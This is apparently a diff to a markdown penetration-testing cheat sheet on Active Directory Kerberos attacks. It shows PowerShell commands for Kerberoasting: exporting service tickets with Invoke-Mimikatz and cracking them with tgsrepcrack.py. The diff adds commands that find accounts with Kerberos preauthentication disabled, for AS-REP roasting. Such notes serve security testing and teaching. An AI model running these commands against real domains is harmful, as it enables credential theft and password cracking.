@@ -2,7 +2,7 @@
 
 
 ### Kerberoasting
----
+
 
 ```powershell
 # Standard AD User. Get Domain Users SPN. Users that are for services
@@ -44,4 +44,11 @@ C:> Invoke-Mimikatz -Command '"kerberos::list /export"'
 C:> python.exe .\tgsrepcrack.py .\<wordlist>.txt .\<exported_file_from_mimikatz>.kirbi
 ```
 ### Targeted Kerberoasting AS-REPs
----
+###### Enumerating accounts with Kerberos Preauth disabled
+```powershell
+# 
+# PowerView
+C:> Get-DomainUser -PreauthNotRequired -Verbose             
+# AD Module
+C:> Get-ADUser -Filter {DoesNotRequirePreAuth -eq $True} -Properties DoesNotRequirePreAuth
+```
